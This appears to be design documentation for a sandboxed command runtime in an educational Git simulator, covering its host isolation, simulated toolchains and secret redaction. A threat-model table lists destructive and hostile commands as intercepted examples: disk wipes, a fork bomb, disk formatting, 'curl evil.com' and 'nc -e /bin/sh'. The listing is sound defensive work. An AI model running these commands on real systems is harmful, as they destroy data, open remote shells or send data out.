# Safe Command Runtime & Host Sandboxing (`SafeCommandRuntime`)

## 1. Security Invariant & Sandboxing Guarantees
In browser-based and server-side educational platforms, student workflows must never execute arbitrary commands on the host machine. Git Academy Vietnam enforces a strict security invariant:

> **STRICT GUARANTEE: Zero Host Command Executions.**
> Under no circumstances does the simulator invoke `child_process.exec`, `child_process.execSync`, `child_process.spawn`, `child_process.fork`, or `eval()`. All commands run strictly in-memory within a virtual environment.

---

## 2. Threat Modeling & Intercepted Command Vectors

The sandbox guards against intentional or unintentional destructive patterns:

| Attack Vector | Example Command | Sandbox Defense |
|---|---|---|
| **Filesystem Wipe** | `rm -rf /`, `rm -rf ~`, `del /f /s /q C:\*` | Intercepted by host guard; returns exit code 0 with policy explanation; 0 disk access. |
| **Network Exfiltration** | `curl evil.com`, `wget payload`, `nc -e /bin/sh` | Intercepted; no sockets or network interfaces opened. |
| **Privilege Escalation** | `sudo su -`, `chmod -R 777 /` | Intercepted; permissions cannot be altered outside sandbox memory. |
| **Denial of Service** | `:(){ :|:& };:`, `killall -9 node` | Intercepted; no processes spawned or terminated. |
| **Subshell Spawning** | `bash -c ...`, `powershell ...`, `cmd.exe /c ...` | Intercepted; prevents escape to external interpreters. |
| **Disk Formatting** | `mkfs.ext4 /dev/sda`, `format c:` | Intercepted; block devices remain untouched. |

### Interception Output
When a prohibited command is encountered, the simulator safely intercepts it and logs:
```
[SafeRuntime Guard] Host security policy intercepted command: "<command>".
[SafeRuntime Guard] Arbitrary host network/file operations are strictly isolated.
```

---

## 3. Simulated Toolchains
Rather than invoking actual host binaries, `SafeCommandRuntime` models the realistic output and exit codes of standard development tools:

### 1. Package Managers (`npm`, `pnpm`, `yarn`)
- `npm install`, `pnpm add`, `yarn install`:
  Outputs simulated package counts, timings, and audit reports without downloading remote tarballs.

### 2. Test Runners (`vitest`, `jest`, `npm test`)
- Standard run: Produces `PASS` test runner reports.
- Failure simulation: When `--fail` flag is supplied or `FAIL_TESTS=true` is set in the environment, the runtime produces realistic `FAIL` tracebacks and returns exit code `1`.

### 3. Build Tools
- `npm run build`, `vite build`, `tsc`:
  Simulates asset bundling, chunk generation, and transformation timings.

### 4. Linters
- `npm run lint`, `eslint`:
  Validates project formatting and reports rule status.

### 5. File System Utilities
- `cat <file>`, `type <file>`: Reads exclusively from the scenario's virtual file map.
- `ls`, `dir`: Returns virtual directory structure.
- `echo <msg>`: Expands `$ENV_VARS` safely and outputs to virtual stdout.

---

## 4. Secret Protection (`SecretRedactor`)
Educational workflows frequently teach managing API keys, tokens, and credentials. The `SecretRedactor`:
- Maintains a registry of active secrets.
- Scans stdout and stderr streams prior to presentation in the UI.
- Masks occurrences with `***` across single-line, multi-line, and JSON-encoded outputs.
- Prevents over-redaction by ignoring trivial tokens shorter than 3 characters.
